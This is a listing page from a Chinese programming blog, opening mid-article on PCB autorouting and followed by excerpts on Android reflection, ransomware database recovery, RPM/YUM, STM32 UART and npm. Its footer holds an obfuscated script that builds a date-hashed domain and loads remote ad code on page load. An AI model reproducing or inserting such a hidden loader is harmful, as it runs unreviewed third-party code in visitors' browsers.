多年来，人们总是认为电路板层数越少成本就越低，但是影响电路板的制造成本还有许多其它因素。近几年来，多层板之间的成本差别已经大大减小。在开始设计时最好采用较多的电路层并使敷铜均匀分布，以避免在设计临近结束时才发现有少量信号不符合已定义的规则以及空间要求，从而被迫添加新层。在设计之前认真的规划将减少布线中很多的麻烦。
自动布线工具本身并不知道应该做些什幺。为完成布线任务，布线工具需要在正确的规则和限制条件下工作。不同的信号线有不同的布线要求，要对所有特殊要求的信号线进行分类，不同的设计分类也不一样。每个信号类都应该有优先级，优先级越高，规则也越严格。规则涉及印制线宽度、过孔的最大数量、平行度、信号线之间的相互影响以及层的限制，这些规则对布线工具的性能有很大影响。认真考虑设计要求是成功布线的重要一步。
为最优化装配过程，可制造性设计（DFM）规则会对组件布局产生限制。如果装配部门允许组件移动，可以对电路适当优化，更便于自动布线。所定义的规则和约束条件会影响布局设计。
在布局时需考虑布线路径（routing channel）和过孔区域。这些路径和区域对设计人员而言是显而易见的，但自动布线工具一次只会考虑一个信号，通过设置布线约束条件以及设定可布信号线的层，可以使布线工具能像设计师所设想的那样完成布线。
在扇出设计阶段，要使自动布线工具能对组件引脚进行连接，表面贴装器件的每一个引脚至少应有一个过孔，以便在需要更多的连接时，电路板能够进行内层连接、在线测试（ICT）和电路再处理。
为了使自动布线工具效率最高，一定要尽可能使用最大的过孔尺寸和印制线，间隔设置为50mil较为理想。要采用使布线路径数最大的过孔类型。进行扇出设计时，要考虑到电路在线测试问题。测试夹具可能很昂贵，而且通常是在即将投入全面生产时才会订购，如果这时候才考虑添加节点以实现100%可测试性就太晚了。
经过慎重考虑和预测，电路在线测试的设计可在设计初期进行，在生产过程后期实现，根据布线路径和电路在线测试来确定过孔扇出类型，电源和接地也会影响到布线和扇出设计。为降低滤波电容器连接线产生的感抗，过孔应尽可能靠近表面贴装器件的引脚，必要时可采用手动布线，这可能会对原来设想的布线路径产生影响，甚至可能会导致你重新考虑使用哪种过孔，因此必须考虑过孔和引脚感抗间的关系并设定过孔规格的优先级。
尽管本文主要论述自动布线问题，但手动布线在现在和将来都是印刷电路板设计的一个重要过程。采用手动布线有助于自动布线工具完成布线工作。无论关键信号的数量有多少，首先对这些信号进行布线，手动布线或结合自动布线工具均可。关键信号通常必须通过精心的电路设计才能达到期望的性能。布线完成后，再由有关的工程人员来对这些信号布线进行检查，这个过程相对容易得多。检查通过后，将这些线固定，然后开始对其余信号进行自动布线。
对关键信号的布线需要考虑在布线时控制一些电参数，比如减小分布电感和EMC等，对于其它信号的布线也类似。所有的EDA厂商都会提供一种方法来控制这些参数。在了解自动布线工具有哪些输入参数以及输入参数对布线的影响后，自动布线的质量在一定程度上可以得到保证。
应该采用通用规则来对信号进行自动布线。通过设置限制条件和禁止布线区来限定给定信号所使用的层以及所用到的过孔数量，布线工具就能按照工程师的设计思想来自动布线。如果对自动布线工具所用的层和所布过孔的数量不加限制，自动布线时将会使用到每一层，而且将会产生很多过孔。
​　在设置好约束条件和应用所创建的规则后，自动布线将会达到与预期相近的结果，当然可能还需要进行一些整理工作，同时还需要确保其它信号和网络布线的空间。在一部分设计完成以后，将其固定下来，以防止受到后边布线过程的影响。
采用相同的步骤对其余信号进行布线。布线次数取决于电路的复杂性和你所定义的通用规则的多少。每完成一类信号后，其余网络布线的约束条件就会减少。但随之而来的是很多信号布线需要手动干预。现在的自动布线工具功能非常强大，通常可完成100%的布线。但是当自动布线工具未完成全部信号布线时，就需对余下的信号进行手动布线。
如果你所使用的EDA工具软件能够列出信号的布线长度，检查这些数据，你可能会发现一些约束条件很少的信号布线的长度很长。这个问题比较容易处理，通过手动编辑可以缩短信号布线长度和减少过孔数量。在整理过程中，你需要判断出哪些布线合理，哪些布线不合理。同手动布线设计一样，自动布线设计也能在检查过程中进行整理和编辑。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3b1fbc0ad01e4bc2a2b56c3ee18e1810/" rel="bookmark">
			Android反射2-对反射语法的封装
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		2 对基本反射语法的封装 前面介绍的种种语法，无论是反射出一个类，还是反射出一个构造函数井调用它，都是为了进一步读写类的方法和宇段，所以我们只要封装以下几个方法即可：
反射出 一个构造 函数并调用它 。调用静态方法。调用实例方法 。获取和设置一个字段的值。对泛型的处理 。 2.1 反射出一个构造函数 public static Object createObject(String className, Class[] pareTyples, Object[] pareVaules) { try { Class r = Class.forName(className); Constructor ctor = r.getDeclaredConstructor(pareTyples); ctor.setAccessible(true); return ctor.newInstance(pareVaules); } catch (Exception e) { e.printStackTrace(); } return null; } final String className = "xxx.xxx.TestClassCtor"; Class r = Class.forName(className); //含参 Class[] p3 = {int.class, String.class}; Object[] v3 = {1, "bjq"}; Object obj = RefInvoke.createObject(className, p3, v3); //无参 Object obj2 = RefInvoke.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3b1fbc0ad01e4bc2a2b56c3ee18e1810/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f245e96cc95b4da1d994cf2e6a827c8f/" rel="bookmark">
			sql server 加密更改必须序列化_勒索病毒加密数据库解决方案
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、故障状况 北亚数据恢复中心接到某公司一台被加密的SqlServer数据库，客户要求对数据库进行解密，数据库基本情况如下：
数据库： SQL server
版本： 2008R2
故障状况： 数据库被加密，无法使用
加密数据库个数： 2个
表现方式： 数据库MDF、LDF、log日志文件名字已被改变
数据库加密如下图所示：
图1：数据库加密情况截图
数据库备份被加密，文件名字改变
图2：数据库备份加密情况
二、备份数据库 北亚数据恢复中心首先对客户数据进行镜像备份，避免在对数据库的分析过程中对数据库造成二次破坏，将客户数据库内的数据备份至北亚数据恢复专用存储池中。 三、故障分析及恢复 1、使用专业恢复软件打开中病毒的SQL server数据库，可以看到数据库的头部已被破坏。
图3：使用数据恢复工具查看数据库底层数据
2、sqlserver 数据库页大小8K，按8K大小切块，向下查找，最终分析得出，每128K进行一次加密，加密大小为128字节。
图4：使用数据恢复工具查看数据库底层数据
3、打开数据库备份，发现也是每128K进行一次加密，加密大小为128字节。
图5：数据库加密方式截图
向下搜索数据库页起始标志， 发现此处没有被加密。经过分析，数据库与数据库备份加密方式一样，每128K进行一次加密，加密大小为128字节，由于数据库备份头部记录备份信息，数据库页起始向下偏移。因此数据库中加密的页与数据库备份中加密的页正好错开。
图6：数据库加密方式截图
4、修复加密数据库
结合数据库备份对数据库中加密的页进行修复，通过数据库管理工具附加修改好的数据库，并进行查询验证，后经客户验证，没有任何问题，本次数据恢复成功
图7：数据库解密结果
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8e57755aa82062ae3a53d9d3556e4701/" rel="bookmark">
			linux rpm找不到命令_详解Linux软件安装中RPM与YUM 区别和联系
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		点击上方 “安全优佳” 可以订阅哦！ 概述 一般Linux软件安装有这么几种方式：
通用二进制格式：直接解压压缩文件，就可以使用。但一定要注意安装平台。
软件包管理器：如RPM。
软件包管理器的前端工具：如YUM。
源代码编译。
那么其中rpm与yum有什么区别呢？
RPM RPM管理支持事务机制。增强了程序安装卸载的管理。
RPM的功能：打包、安装、查询、升级、卸载、校验、数据库管理。
1、RPM的缺点
由于Linux中的程序大多是小程序。程序与程序之间存在非常复杂的依赖关系。RPM无法解决软件包的依赖关系。
2、RPM包
用RPM工具可以将二进制程序进行打包，包被称为RPM包。RPM包并不是跨平台的。RedHat的RPM包与SUSE的RPM包不能混用。实际上RedHat的安装，初始软件也都是使用RPM包进行安装的。
源程序的命名规范：name-version.tar.{gz|bz2|xz}
版本号：major.minor.release
例：bash-4.3.1.tar.xz
RPM包的命名规范：name-version-release.os.arch.rpm
name：程序名称。
version：程序版本号。
release(发行号)：用于标识RPM包本身的发行号，与源程序的release号无关。
os：即说明RPM包支持的操作系统版本。如el6(即rhel6)、centos6、el5、suse11。
arch：主机平台。如i686、x86_64、amd64、ppc(power-pc)、noarch(即不依赖平台)
例：bash-4.3.2-5.el6.x86_64.rpm
rpm包
3、安装RPM包
命令格式：rpm -i /PATH/TO/RPM_FILE
一般组合起来使用：-ivh
命令格式：rpm -ivh PATH/TO/RPM_FILE
4、卸载RPM包
命令格式：rpm -e 包名
查询RPM相关信息
命令格式：rpm -q 包名
查询所有已经安装包：rpm -qa
5、RPM的数据库
数据库文件位于：/var/lib/rpm
若库损坏，很多RPM的查询将无法使用。
YUM YUM客户端基于RPM包进行管理，可以通过HTTP服务器下载、FTP服务器下载、本地软件池的等方式获得软件包，可以从指定的服务器自动下载RPM包并且安装，可以自动处理依赖性关系。
YUM在安装RPM时，会从服务器下载相应包，且缓存在本地。
使用YUM进行RPM包的管理，非常简单方便。
1、YUM客户端的使用
YUM客户端的配置
YUM的配置方式是基于分段配置的。
主配置文件：/etc/yum.conf
YUM的片段配置：/etc/yum.repos.d/*.repo
主配置文件配置了一个特殊的仓库，名称为main。main是为其他仓库提供默认的全局配置的。
配置文件的说明：
[main] #main仓库。[ ]中括号表示一个仓库的定义。其中是仓库的名称。
cachedir=/var/cache/yum/$basearch/$releasever #RPM包的缓存位置。
keepcache=0 #RPM包在本地是否需要长期保存。1表示yes，0表示no。
debuglevel=2 #日志级别。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8e57755aa82062ae3a53d9d3556e4701/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b652b16ba702e48f5776e50d46e11e63/" rel="bookmark">
			STM32cubeMX之 uart问题汇总
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		写在前面：
本文章旨在总结备份、方便以后查询，由于是个人总结，如有不对，欢迎指正；另外，内容大部分来自网络、书籍、和各类手册，如若侵权请告知，马上删帖致歉。
目录 一、gcc环境下输入输出重定向问题二、gcc环境下的输出流刷新三、HAL库上的一些函数理解四、未完待续。。。 一、gcc环境下输入输出重定向问题 在 gcc环境下，printf重定向跟以往的在 IDE上的重定向有点不同。
在以往的 Keil、IAR等 IDE上面，都是用以下方式重定向的：
int fputc(int ch, FILE *f)
int fgetc(FILE *f)
但是在 gcc环境下，使用的是如下方式：
int _write(int file, char *ptr, int len)
int _read(int file, char *ptr, int len)
现在明确了 gcc环境下输入输出重定向问题，那么就可以编写对应的函数了。一般地，我们会参考官方的 demo来进行修改编写，很幸运的是官方提供了示例工程，在固件库的 ...\STM32Cube_FW_F1_V1.8.0\Projects\STM32F103RB-Nucleo\Examples\UART\UART_Printf 目录中可以找到它；然，我们真正需要的是 syscalls.c 文件，syscalls翻译过来是系统调用的意思，从里面可以找得到 _write函数和 _read函数的实现方式：
__attribute__((weak)) int _read(int file, char *ptr, int len) { int DataIdx; for (DataIdx = 0; DataIdx &lt; len; DataIdx++) { *ptr++ = __io_getchar(); } return len; } __attribute__((weak)) int _write(int file, char *ptr, int len) { int DataIdx; for (DataIdx = 0; DataIdx &lt; len; DataIdx++) { __io_putchar(*ptr++); } return len; } 于是乎我们直接把整个 syscalls.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b652b16ba702e48f5776e50d46e11e63/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9d2fca10bfbf83a65518efd8e043bfd7/" rel="bookmark">
			杂凑函数的性质
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		杂凑函数具有哪些性质？
（1）无碰撞性
（2）杂凑函数应用于密码学，具有不可抵赖性
（3）杂凑算法可与加密及数字签名结合使用，实现系统的有效、安全、保密与认证
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1f6be11e7a5d418546dcab47bc79832c/" rel="bookmark">
			包管理-安装配置
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		包的安装
安装（install）即下载包 由于 npm 的官方 registry 服务器位于国外，可能受网速影响导致下载缓慢或失败。因此，安装好 npm 之后，需要重新设置 registry 的地址为国内地址。目前，淘宝 https://registry.npm.taobao.org 提供了国内的 registry 地址，先设置到该地址。设置方式为npm config set registry https://registry.npm.taobao.org。设置好后，通过命令npm config get registry进行检查
npm 安装一个包，分为两种安装方式：
本地安装
全局安装
本地安装
使用命令npm install 包名或npm i 包名即可完成本地安装
本地安装的包出现在当前目录下的node_modules目录中
随着开发的进展，node_modules目录会变得异常庞大，目录下的内容不适合直接传输到生产环境，因此通常使用.gitignore文件忽略该目录中的内容 本地安装适用于绝大部分的包，它会在当前目录及其子目录中发挥作用 通常在项目的根目录中使用本地安装 安装一个包的时候，npm 会自动管理依赖，它会下载该包的依赖包到node_modules目录中 如果本地安装的包带有 CLI，npm 会将它的 CLI 脚本文件放置到node_modules/.bin下，使用命令npx 命令名即可调用
全局安装
全局安装的包放置在一个特殊的全局目录，该目录可以通过命令npm config get prefix查看
使用命令npm install --global 包名 或 npm i -g 包名
重要：全局安装的包并非所有工程可用，它仅提供全局的 CLI 工具
大部分情况下，都不需要全局安装包，除非：
包的版本非常稳定，很少有大的更新
提供的 CLI 工具在各个工程中使用的非常频繁
CLI 工具仅为开发环境提供支持，而非部署环境
包配置
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1f6be11e7a5d418546dcab47bc79832c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/90c248a93b33b2a8bcaef787cc666019/" rel="bookmark">
			Windows远程桌面突然不能复制粘贴的解决办法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 经常使用的一台远程计算机，最近突然不能复制粘贴了。
已知本地计算机和远程计算机都是windows操作系统，确认远程桌面连接选项“本地资源-》本地设备和资源-》剪贴板”中勾选了剪贴板，并且过去复制粘贴操作一直使用正常。
现象：
1. 本地计算机复制粘贴操作正常。
2. 远程计算机本身的复制粘贴操作也正常。
3. 本地计算机的文本、文件等资源无法复制到远程计算机，带上耳机的话会听到粘贴时有“咚”的提示音；远程计算机的文本、文件等资源也无法复制到本地计算机。
4. 断开远程桌面连接，重新建立连接，问题依旧。
5. 重启本机计算机，重新建立连接，问题依旧。
问题原因：
rdpclip.exe服务失效。
微软的人的解释：rdpclip.exe 的功能是控制本机与远程服务器之间复制粘贴文件，也包括粘贴文本。可能由于网络方面的不稳定，导致当应用远程桌面进行文件传输时，因网络等导致进程中断，再次传输时则不能进行文件传输，此时可以通过重启rdpclip.exe进程来解决此问题。
上面是微软论坛上微软服务人员很牵强的解释，结果被咨询问题的人鄙视，diao了一顿。其实这应该可以看成是程序bug了。
解决办法：
治标不治本的解决办法，即在远程计算机上重启rdpclip.exe进程：
1. 任务管理器》结束进程rdpclip.exe。
2. 开始》运行rdpclip.exe
或者直接在远程计算机的cmd中运行：
taskkill -im rdpclip.exe -f rdpclip 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/de5e975a54c1b9fd69abdfe6db837e74/" rel="bookmark">
			shell脚本 遍历目录下所有文件并执行某操作
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 #!/bin/bash demofun(){ for file in `ls $1` do if test -f $file then echo "file: $file" dpkg -x $file . #需要执行的命令，这里解包deb文件 elif test -d $file then echo "path: $file" fi done } path="/home/work/xxx/xxx" demofun $path 
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/posts/page/406/">«</a>
	<span class="pagination__item pagination__item--current">407/578</span>
	<a class="pagination__item pagination__item--next btn" href="/posts/page/408/">»</a>
</div>

			</div>
			

		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2023 编程随想.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>

<script src="https://www.w3counter.com/tracker.js?id=151182"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>